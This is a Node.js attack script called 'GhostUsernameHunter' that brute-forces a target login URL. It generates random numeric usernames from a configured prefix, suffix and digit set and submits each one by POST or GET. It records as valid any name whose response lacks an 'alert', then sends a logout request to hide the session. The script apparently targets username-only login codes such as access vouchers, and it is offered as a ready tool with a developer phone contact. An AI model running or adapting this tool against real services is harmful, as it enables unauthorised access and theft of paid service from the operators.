const fs = require('fs');
const axios = require('axios');
const chalk = require('chalk');
const TOOL_NAME = "GhostUsernameHunter"; //name of the tool
const CONFIG_FILE = 'config.json';

function loadConfig() {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
}

let config = loadConfig();
let lastModified = fs.statSync(CONFIG_FILE).mtimeMs;

let {
    url,
    logout_url,
    method = "POST",
    length,
    digits,
    prefix,
    suffix,
    count
} = config;

let randomPartLength = length - prefix.length - suffix.length;
let tested = new Set();

// تحميل اليوزرات من usernames.txt
/*if (fs.existsSync('usernames.txt')) {
    const usernames = fs.readFileSync('usernames.txt', 'utf-8')
        .split(/\r?\n/)
        .filter(line => line.trim() !== '');
    usernames.forEach(username => tested.add(username));
}*/

// تحميل اليوزرات التي تم تجربتها مسبقًا
if (fs.existsSync('tested_usernames.txt')) {
    const oldTested = fs.readFileSync('tested_usernames.txt', 'utf-8')
        .split(/\r?\n/)
        .filter(Boolean);
    oldTested.forEach(username => tested.add(username));
}

let i = 0;
//console.log(chalk.cyan("=".repeat(50)));
//console.log(chalk.green("         Username Testing Tool"));
//console.log(chalk.cyan("=".repeat(50)));
console.log(chalk.cyan("=".repeat(60)));
console.log(chalk.green(`             ${TOOL_NAME}`));
console.log(chalk.cyan("=".repeat(60)));
console.log(chalk.green("Developed By Ghost Contact +967776977357"));
console.log(chalk.cyan("=".repeat(50)));
console.log(chalk.yellow(`Target: ${url}`));
console.log(chalk.yellow(`Method: ${method}`));
console.log(chalk.yellow(`Usernames to Test: ${count}`));
console.log(chalk.yellow(`Username Format: ${prefix}[random]${suffix}`));
console.log(chalk.yellow(`Random Length: ${randomPartLength}`));
console.log(chalk.cyan("=".repeat(50)));

function generateUsername() {
    let randomPart = '';
    for (let i = 0; i < randomPartLength; i++) {
        randomPart += digits.charAt(Math.floor(Math.random() * digits.length));
    }
    return prefix + randomPart + suffix;
}

(async function run() {
    for (let _ = 0; _ < count; _++) {
 const  startt=Date.now();
        const newModified = fs.statSync(CONFIG_FILE).mtimeMs;
        if (newModified !== lastModified) {
            console.log(chalk.yellow("\n[*] Detected change in config.json, reloading..."));
            config = loadConfig();
            ({ url, logout_url, method, length, digits, prefix, suffix, count } = config);
            randomPartLength = length - prefix.length - suffix.length;
            lastModified = newModified;
            console.log(chalk.cyan("[+] New settings applied!"));
        }

        let username = generateUsername();
        if (tested.has(username)) continue;
        tested.add(username);
        fs.appendFileSync("tested_usernames.txt", username + "\n"); // حفظ اليوزر
        i++;

        console.log(chalk.magenta(`[DEBUG] ${username} Number #${i}`));

        try {
            let response;
            if (method === "POST") {
                response = await axios.post(url, new URLSearchParams({ username }));
            } else if (method === "GET") {
                response = await axios.get(url, { params: { username } });
            } else {
                console.log(chalk.red(`[!] Unsupported method: ${method}`));
                break;
            }
          

            if (response.data.includes("alert")) {
                console.log(chalk.red(`[-] Invalid: ${username}`));
            } else {
                console.log(chalk.green(`[+] Valid username: ${username}`));
                const now = new Date().toLocaleString();
                fs.appendFileSync("valid_usernames.txt", `${username} - Time: ${now}\n`);

                if (logout_url) {
                    try {
                        await axios.post(logout_url, new URLSearchParams({ username }));
                        console.log(chalk.blue(`[!] Logout request sent for ${username}`));
                    } catch (err) {
                        console.log(chalk.red(`[!] Logout failed: ${err}`));
                    }
                }
            }
   const  End=Date.now();
    console.log(chalk.gray(`Token Time ${End-startt}`));
        } catch (err) {
            console.log(chalk.red(`[!] Request failed for ${username}: ${err.message}`));
        }

//        await new Promise(resolve => setTimeout(resolve, 100)); // wait 100ms
    }

    console.log(chalk.cyan("\n[*] Done."));
})();
